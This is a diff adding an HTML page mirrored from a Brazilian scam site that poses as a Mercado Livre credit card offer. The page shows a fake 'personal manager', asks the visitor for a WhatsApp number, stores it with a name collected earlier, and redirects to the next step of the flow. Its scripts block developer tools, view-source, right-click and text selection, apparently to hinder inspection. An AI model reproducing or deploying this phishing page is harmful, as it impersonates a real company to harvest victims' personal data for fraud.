@@ -1,0 +1,302 @@
+<html lang="pt-BR">
+
+<head>
+    <script async="" src="js/fbevents.js"></script>
+    <script async="" defer="" src="js/pixel_1.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+    <script async="" defer="" src="js/pixel_2.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
+</head>
+
+<body>
+
+
+    <!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartão Mercado Livre - Sua Gerente</title>
+
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Inter", sans-serif;
+        }
+
+        body {
+            background-color: #f6f6f6;
+            color: #1f2937;
+            line-height: 1.6;
+        }
+
+        .header {
+            background: linear-gradient(147deg, #003675 0%, #0d64fb 74%);
+            color: #333;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-top: -30px;
+        }
+
+        .main-content {
+            max-width: 480px;
+            background-color: #ffffff;
+            padding: 2rem;
+            border-radius: 12px;
+            margin: 40px auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+        }
+
+        .welcome-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .welcome-title span {
+            color: #0d64fb;
+        }
+
+        .subtitle {
+            color: #6b7280;
+            margin-bottom: 2rem;
+            text-align: center;
+            font-size: 1rem;
+        }
+
+        .manager-card {
+            background: #fff5f3;
+            border: 1px solid rgba(238, 77, 45, 0.1);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .manager-photo {
+            width: 120px;
+            height: 120px;
+            border-radius: 60px;
+            margin-bottom: 1rem;
+            border: 3px solid #0d64fb;
+            padding: 3px;
+        }
+
+        .manager-role {
+            color: #6b7280;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .manager-name {
+            color: #0d64fb;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .manager-award {
+            background: white;
+            color: #4b5563;
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            display: inline-block;
+            margin-top: 0.5rem;
+        }
+
+        .contact-info {
+            text-align: center;
+            color: #4b5563;
+            margin: 1.5rem 0;
+            font-size: 0.9375rem;
+            line-height: 1.6;
+        }
+
+        .form-label {
+            color: #6b7280;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.875rem 1.25rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 50px;
+            font-size: 1rem;
+            color: #1f2937;
+            transition: all 0.2s ease;
+        }
+
+        .form-control:focus {
+            border-color: #0d64fb;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(238, 77, 45, 0.1);
+        }
+
+        .btn-custom {
+            background: linear-gradient(135deg, #0d64fb 0%, #0d64fb 100%);
+            color: rgb(255, 255, 255);
+            border: none;
+            width: 100%;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1.5rem;
+        }
+
+        .btn-custom:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(238, 77, 45, 0.2);
+        }
+
+        .footer {
+            background-color: #1a1a1a;
+            color: #f5f5f5;
+            text-align: center;
+            padding: 2rem 1rem;
+            border-bottom: solid 3px #ffc600;
+            font-size: 0.875rem;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                margin: 1rem;
+                padding: 1.5rem;
+            }
+            .manager-card {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+
+    <div style="
+        display: grid;
+        grid-template-areas: 'top-bar' 'content' 'footer';
+        grid-template-rows: auto 1fr auto;
+        min-height: 100vh;
+      ">
+        <div class="header">
+            <img src="images/logo.png" alt="Shopee Logo" style="width: 120px">
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem">
+            <div class="main-content">
+                <div id="introducao-gerente">
+                    <h2 class="welcome-title">
+                        Ótimo, quase lá <span id="nomeUsuario"></span>!
+                    </h2>
+                    <p class="subtitle">
+                        Antes de escolher uma forma de envio, conheça sua Gerente Responsável:
+                    </p>
+
+                    <div class="manager-card">
+                        <img src="images/gerente.jpg" class="manager-photo" alt="Foto da Gerente">
+                        <p class="manager-role">Gerente</p>
+                        <h4 class="manager-name">Juliana Benedito</h4>
+                        <span class="manager-award">🏆 Melhor gerente 2023-2024</span>
+                    </div>
+
+                    <p class="contact-info">
+                        Após concluir o procedimento, Juliana entrará em contato para garantir um atendimento humanizado sempre que você precisar.
+                    </p>
+
+                    <div class="form-group">
+                        <label for="whatsapp" class="form-label">Digite seu WhatsApp</label>
+                        <input type="text" class="form-control" id="whatsapp" placeholder="(00) 00000-0000">
+                    </div>
+
+                    <button type="submit" class="btn-custom" onclick="enviarWhatsApp()">
+              Continuar
+            </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function carregarNomeUsuario() {
+            const nomeCompleto = localStorage.getItem("nome");
+            const primeiroNome = nomeCompleto ? nomeCompleto.split(" ")[0] : "";
+            document.getElementById("nomeUsuario").innerText = primeiroNome;
+        }
+
+        carregarNomeUsuario();
+
+        function enviarWhatsApp() {
+            const whatsapp = document.getElementById("whatsapp").value;
+            if (whatsapp) {
+                localStorage.setItem("whatsapp", whatsapp);
+                window.location.href = "../cep/index.html" + window.location.search;
+            } else {
+                alert("Por favor, insira seu número de WhatsApp.");
+            }
+        }
+    </script>
+
+    <!-- Utmify utms capture -->
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- Utmify pixel -->
+    <script>
+        window.pixelId = "66bb763debbcebab27d68442";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Utmify end -->
+
+    <script>
+        // Impedir a tecla F12 (abre as ferramentas de desenvolvedor)
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123) { // F12
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + Shift + I (Ferramentas de desenvolvedor)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+            }
+
+            // Impedir Ctrl + U (exibir código fonte)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+            }
+        });
+
+        // Impedir o menu de contexto (botão direito)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+
+    <script>
+        // Impedir a seleção de texto em toda a página
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+        });
+
+        // Também bloqueia a seleção via CSS
+        document.body.style.userSelect = 'none'; // Para navegadores modernos
+    </script>
+
+
+
+</body>
+<!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT -->
+
+</html>
